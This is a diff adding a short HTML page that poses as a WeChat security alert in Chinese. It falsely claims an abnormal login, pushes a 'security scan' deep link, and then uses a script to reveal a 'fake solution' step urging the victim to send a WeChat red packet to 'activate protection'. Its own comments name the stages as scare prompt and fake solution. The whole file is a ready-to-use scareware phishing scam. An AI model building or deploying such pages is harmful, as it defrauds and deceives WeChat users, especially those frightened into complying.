@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#000;color:#fff;text-align:center;padding:20px">
+  <h2>⚠️ 微信安全警报</h2>
+  <p>检测到账户异常登录</p>
+  
+  <!-- 第一阶段：恐吓提示 -->
+  <a href="weixin://dl/settings?action=security_scan" 
+     style="display:block;background:#c00;padding:15px;color:white;margin:10px">
+     立即进行安全扫描 >>
+  </a>
+  
+  <!-- 第二阶段：虚假解决方案 -->
+  <div id="solution" style="display:none">
+    <p>✅ 威胁已隔离！请完成最后一步：</p>
+    <a href="weixin://dl/redpacket?type=1&amount=0.01" 
+       style="display:block;background:#07c160;padding:15px;color:white">
+       发送0.01元红包激活保护
+    </a>
+  </div>
+  
+  <script>
+    // 第一次点击后显示"解决方案"
+    document.querySelector('a').addEventListener('click', function() {
+      setTimeout(() => {
+        document.getElementById('solution').style.display = 'block';
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
